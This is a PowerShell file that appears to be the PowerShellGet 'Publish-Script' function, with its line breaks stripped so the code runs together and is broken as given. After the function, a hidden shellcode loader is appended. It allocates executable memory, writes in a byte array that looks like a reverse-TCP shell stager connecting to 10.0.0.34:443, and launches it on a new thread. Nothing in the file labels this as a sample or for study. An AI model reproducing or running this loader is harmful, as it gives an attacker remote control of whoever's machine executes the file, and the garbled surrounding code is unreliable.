function Publish-Script {[CmdletBinding(SupportsShouldProcess = $true,PositionalBinding = $false,DefaultParameterSetName = 'PathParameterSet',HelpUri = 'https://go.microsoft.com/fwlink/?LinkId=619788')]Param([Parameter(Mandatory = $true,ValueFromPipelineByPropertyName = $true,ParameterSetName = 'PathParameterSet')][ValidateNotNullOrEmpty()][string]$Path,[Parameter(Mandatory = $true,ValueFromPipelineByPropertyName = $true,ParameterSetName = 'LiteralPathParameterSet')][Alias('PSPath')][ValidateNotNullOrEmpty()][string]$LiteralPath,[Parameter()][ValidateNotNullOrEmpty()][string]$NuGetApiKey,[Parameter()][ValidateNotNullOrEmpty()][string]$Repository = $Script:PSGalleryModuleSource,[Parameter(ValueFromPipelineByPropertyName = $true)][PSCredential]$Credential,[Parameter()][switch]$Force)Begin {Install-NuGetClientBinaries -CallerPSCmdlet $PSCmdlet -BootstrapNuGetExe -Force:$Force}Process {$scriptFilePath = $nullif ($Path) {$scriptFilePath = Resolve-PathHelper -Path $Path -CallerPSCmdlet $PSCmdlet |Microsoft.PowerShell.Utility\Select-Object -First 1 -ErrorAction Ignoreif (-not $scriptFilePath -or-not (Microsoft.PowerShell.Management\Test-Path -Path $scriptFilePath -PathType Leaf)) {$errorMessage = ($LocalizedData.PathNotFound -f $Path)ThrowError  -ExceptionName "System.ArgumentException" `-ExceptionMessage $errorMessage `-ErrorId "PathNotFound" `-CallerPSCmdlet $PSCmdlet `-ExceptionObject $Path `-ErrorCategory InvalidArgument}}else {$scriptFilePath = Resolve-PathHelper -Path $LiteralPath -IsLiteralPath -CallerPSCmdlet $PSCmdlet |Microsoft.PowerShell.Utility\Select-Object -First 1 -ErrorAction Ignoreif (-not $scriptFilePath -or-not (Microsoft.PowerShell.Management\Test-Path -LiteralPath $scriptFilePath -PathType Leaf)) {$errorMessage = ($LocalizedData.PathNotFound -f $LiteralPath)ThrowError  -ExceptionName "System.ArgumentException" `-ExceptionMessage $errorMessage `-ErrorId "PathNotFound" `-CallerPSCmdlet $PSCmdlet `-ExceptionObject $LiteralPath `-ErrorCategory InvalidArgument}}if (-not $scriptFilePath.EndsWith('.ps1', [System.StringComparison]::OrdinalIgnoreCase)) {$errorMessage = ($LocalizedData.InvalidScriptFilePath -f $scriptFilePath)ThrowError  -ExceptionName "System.ArgumentException" `-ExceptionMessage $errorMessage `-ErrorId "InvalidScriptFilePath" `-CallerPSCmdlet $PSCmdlet `-ExceptionObject $scriptFilePath `-ErrorCategory InvalidArgumentreturn}if ($Repository -eq $Script:PSGalleryModuleSource) {$repo = Get-PSRepository -Name $Repository -ErrorAction SilentlyContinue -WarningAction SilentlyContinueif (-not $repo) {$message = $LocalizedData.PSGalleryNotFound -f ($Repository)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $message `-ErrorId 'PSGalleryNotFound' `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgument `-ExceptionObject $Repositoryreturn}}else {$ev = $null$repo = Get-PSRepository -Name $Repository -ErrorVariable evif ($ev -or (-not $repo)) { return }}$DestinationLocation = $nullif (Get-Member -InputObject $repo -Name $script:ScriptPublishLocation) {$DestinationLocation = $repo.ScriptPublishLocation}if (-not $DestinationLocation -or(-not (Microsoft.PowerShell.Management\Test-Path -Path $DestinationLocation) -and-not (Test-WebUri -uri $DestinationLocation))) {$message = $LocalizedData.PSRepositoryScriptPublishLocationIsMissing -f ($Repository, $Repository)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $message `-ErrorId "PSRepositoryScriptPublishLocationIsMissing" `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgument `-ExceptionObject $Repository}$message = $LocalizedData.PublishLocation -f ($DestinationLocation)Write-Verbose -Message $messageif (-not $NuGetApiKey.Trim()) {if (Microsoft.PowerShell.Management\Test-Path -Path $DestinationLocation) {$NuGetApiKey = "$(Get-Random)"}else {$message = $LocalizedData.NuGetApiKeyIsRequiredForNuGetBasedGalleryService -f ($Repository, $DestinationLocation)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $message `-ErrorId "NuGetApiKeyIsRequiredForNuGetBasedGalleryService" `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgument}}$providerName = Get-ProviderName -PSCustomObject $repoif ($providerName -ne $script:NuGetProviderName) {$message = $LocalizedData.PublishScriptSupportsOnlyNuGetBasedPublishLocations -f ($DestinationLocation, $Repository, $Repository)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $message `-ErrorId "PublishScriptSupportsOnlyNuGetBasedPublishLocations" `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgument `-ExceptionObject $Repository}if ($Path) {$PSScriptInfo = Test-ScriptFileInfo -Path $scriptFilePath}else {$PSScriptInfo = Test-ScriptFileInfo -LiteralPath $scriptFilePath}if (-not $PSScriptInfo) {return}$scriptName = $PSScriptInfo.Name$result = ValidateAndGet-VersionPrereleaseStrings -Version $PSScriptInfo.Version -CallerPSCmdlet $PSCmdletif (-not $result) {return}$scriptVersion = $result["Version"]$scriptPrerelease = $result["Prerelease"]$scriptFullVersion = $result["FullVersion"]$tempScriptPath = Microsoft.PowerShell.Management\Join-Path -Path $script:TempPath -ChildPath "$(Get-Random)" |Microsoft.PowerShell.Management\Join-Path -ChildPath $scriptName$null = Microsoft.PowerShell.Management\New-Item -Path $tempScriptPath -ItemType Directory -Force -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -Confirm:$false -WhatIf:$falseif ($Path) {Microsoft.PowerShell.Management\Copy-Item -Path $scriptFilePath -Destination $tempScriptPath -Force -Recurse -Confirm:$false -WhatIf:$false}else {Microsoft.PowerShell.Management\Copy-Item -LiteralPath $scriptFilePath -Destination $tempScriptPath -Force -Recurse -Confirm:$false -WhatIf:$false}try {$FindParameters = @{Name            = $scriptNameRepository      = $RepositoryTag             = 'PSModule'AllowPrerelease = $trueVerbose         = $VerbosePreferenceErrorAction     = 'SilentlyContinue'WarningAction   = 'SilentlyContinue'Debug           = $DebugPreference}if ($Credential) {$FindParameters[$script:Credential] = $Credential}$modulePSGetItemInfo = Find-Module @FindParameters |Microsoft.PowerShell.Core\Where-Object { $_.Name -eq $scriptName } |Microsoft.PowerShell.Utility\Select-Object -Last 1 -ErrorAction Ignoreif ($modulePSGetItemInfo) {$message = $LocalizedData.SpecifiedNameIsAlearyUsed -f ($scriptName, $Repository, 'Find-Module')ThrowError -ExceptionName "System.InvalidOperationException" `-ExceptionMessage $message `-ErrorId "SpecifiedNameIsAlearyUsed" `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidOperation `-ExceptionObject $scriptName}$null = $FindParameters.Remove('Tag')$currentPSGetItemInfo = $null$currentPSGetItemInfo = Find-Script @FindParameters |Microsoft.PowerShell.Core\Where-Object { $_.Name -eq $scriptName } |Microsoft.PowerShell.Utility\Select-Object -Last 1 -ErrorAction Ignoreif ($currentPSGetItemInfo) {$result = ValidateAndGet-VersionPrereleaseStrings -Version $currentPSGetItemInfo.Version -CallerPSCmdlet $PSCmdletif (-not $result) {return}$galleryScriptVersion = $result["Version"]$galleryScriptPrerelease = $result["Prerelease"]$galleryScriptFullVersion = $result["FullVersion"]if ($galleryScriptFullVersion -eq $scriptFullVersion) {$message = $LocalizedData.ScriptVersionIsAlreadyAvailableInTheGallery -f ($scriptName,$scriptFullVersion,$galleryScriptFullVersion,$currentPSGetItemInfo.RepositorySourceLocation)ThrowError -ExceptionName "System.InvalidOperationException" `-ExceptionMessage $message `-ErrorId 'ScriptVersionIsAlreadyAvailableInTheGallery' `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidOperation}if ($galleryScriptVersion -eq $scriptVersion -and -not $Force) {if (-not $Force -and (-not $galleryScriptPrerelease -and $scriptPrerelease)) {$message = $LocalizedData.ScriptPrereleaseStringShouldBeGreaterThanGalleryPrereleaseString -f ($scriptName,$scriptVersion,$scriptPrerelease,$galleryScriptPrerelease,$currentPSGetItemInfo.RepositorySourceLocation)ThrowError -ExceptionName "System.InvalidOperationException" `-ExceptionMessage $message `-ErrorId "ScriptPrereleaseStringShouldBeGreaterThanGalleryPrereleaseString" `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidOperation}elseif ($galleryScriptPrerelease -and $scriptPrerelease) {if (-not $Force -and ($galleryScriptPrerelease -gt $scriptPrerelease)) {$message = $LocalizedData.ScriptPrereleaseStringShouldBeGreaterThanGalleryPrereleaseString -f ($scriptName,$scriptVersion,$scriptPrerelease,$galleryScriptPrerelease,$currentPSGetItemInfo.RepositorySourceLocation)ThrowError -ExceptionName "System.InvalidOperationException" `-ExceptionMessage $message `-ErrorId "ScriptPrereleaseStringShouldBeGreaterThanGalleryPrereleaseString" `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidOperation}}}elseif (-not $Force -and (Compare-PrereleaseVersions -FirstItemVersion $scriptVersion `-FirstItemPrerelease $scriptPrerelease `-SecondItemVersion $galleryScriptVersion `-SecondItemPrerelease $galleryScriptPrerelease)) {$message = $LocalizedData.ScriptVersionShouldBeGreaterThanGalleryVersion -f ($scriptName,$scriptVersion,$galleryScriptVersion,$currentPSGetItemInfo.RepositorySourceLocation)ThrowError -ExceptionName "System.InvalidOperationException" `-ExceptionMessage $message `-ErrorId "ScriptVersionShouldBeGreaterThanGalleryVersion" `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidOperation}}$shouldProcessMessage = $LocalizedData.PublishScriptwhatIfMessage -f ($PSScriptInfo.Version, $scriptName)if ($Force -or $PSCmdlet.ShouldProcess($shouldProcessMessage, "Publish-Script")) {$PublishPSArtifactUtility_Params = @{PSScriptInfo     = $PSScriptInfoNugetApiKey      = $NuGetApiKeyDestination      = $DestinationLocationRepository       = $RepositoryNugetPackageRoot = $tempScriptPathVerbose          = $VerbosePreferenceWarningAction    = $WarningPreferenceErrorAction      = $ErrorActionPreferenceDebug            = $DebugPreference}if ($PSBoundParameters.ContainsKey('Credential')) {$PublishPSArtifactUtility_Params.Add('Credential', $Credential)}Publish-PSArtifactUtility @PublishPSArtifactUtility_Params}}finally {Microsoft.PowerShell.Management\Remove-Item $tempScriptPath -Force -Recurse -ErrorAction Ignore -WarningAction SilentlyContinue -Confirm:$false -WhatIf:$false}}}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x00,0x22,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};